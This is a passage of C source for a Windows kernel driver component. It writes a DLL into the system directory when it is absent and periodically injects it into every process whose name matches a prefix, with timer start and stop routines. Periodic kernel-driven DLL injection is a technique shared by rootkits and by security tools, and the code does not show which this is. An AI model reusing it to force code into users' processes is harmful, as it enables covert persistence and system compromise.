	BOOLEAN bDllExists = FALSE;

	Status = ResolveSystemRootPathToUmPath(&DllPathLink, &DllPath);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "ResolveSystemRootPathToUmPath error=%x", Status);
		return Status;
	}
	
	KLog(LInfo, "DllPath resolved=%wZ", DllPath);

	Status = InjectDllCheckAlreadyExists(&DllFilePath, &bDllExists);
	if (!NT_SUCCESS(Status)) {
		KLog(LInfo, "InjectDllCheckAlreadyExists failed with err=%x", Status);
	}

	KLog(LInfo, "DllPath resolved=%wZ, bDllExists=%d", DllPath, bDllExists);
	
	if (!bDllExists) {
		Status = InjectDllDrop(&DllFilePath);
		if (!NT_SUCCESS(Status)) {
			KLog(LError, "InjectDllDrop failed with err=%x", Status);
			goto cleanup;
		}
	}

	Status = InjectFindAllProcessesAndInjectDll(&ProcPrefix, &DllPath, &DllName);

cleanup:
	if (DllPath.Buffer != NULL)
		ExFreePoolWithTag(DllPath.Buffer, MODULE_TAG);

	return Status;
}


VOID NTAPI
InjectTimerDpcRoutine(
_In_      struct _KDPC *Dpc,
_In_opt_  PVOID DeferredContext,
_In_opt_  PVOID SystemArgument1,
_In_opt_  PVOID SystemArgument2
)
{
	PINJECT_BLOCK Inject = (PINJECT_BLOCK)DeferredContext;

	SysWorkerAddWork(&Inject->Worker, InjectDllWorker, Inject);
}

VOID
	InjectInit(PINJECT_BLOCK Inject)
{
	KeInitializeTimer(&Inject->Timer);
	KeInitializeDpc(&Inject->TimerDpc, InjectTimerDpcRoutine, Inject);
	SysWorkerInit(&Inject->Worker);
}

NTSTATUS
	InjectStart(PINJECT_BLOCK Inject)
{
	NTSTATUS Status;
	LARGE_INTEGER TimerDueTime;

	Status = SysWorkerStart(&Inject->Worker);
	if (!NT_SUCCESS(Status)) {
		goto start_failed;
	}

	TimerDueTime.QuadPart = 0;
	KeSetTimerEx(&Inject->Timer, TimerDueTime, 5*60*1000, &Inject->TimerDpc);//3min
	return STATUS_SUCCESS;

start_failed:
	KeCancelTimer(&Inject->Timer);
	KeFlushQueuedDpcs();
	SysWorkerStop(&Inject->Worker);

	return Status;
}

NTSTATUS
	InjectEmptyWork(PINJECT_BLOCK Inject)
{
	return STATUS_SUCCESS;
}

VOID
	InjectStop(PINJECT_BLOCK Inject)
{
	PSYS_WRK_ITEM WrkItem = NULL;

	KeCancelTimer(&Inject->Timer);
	KeFlushQueuedDpcs();


	WrkItem = SysWorkerAddWorkRef(&Inject->Worker, InjectEmptyWork, Inject);
	if (WrkItem != NULL) {
		KeWaitForSingleObject(&WrkItem->CompletionEvent, Executive, KernelMode, FALSE, NULL);
		SYS_WRK_ITEM_DEREF(WrkItem)
	}

	SysWorkerStop(&Inject->Worker);
}
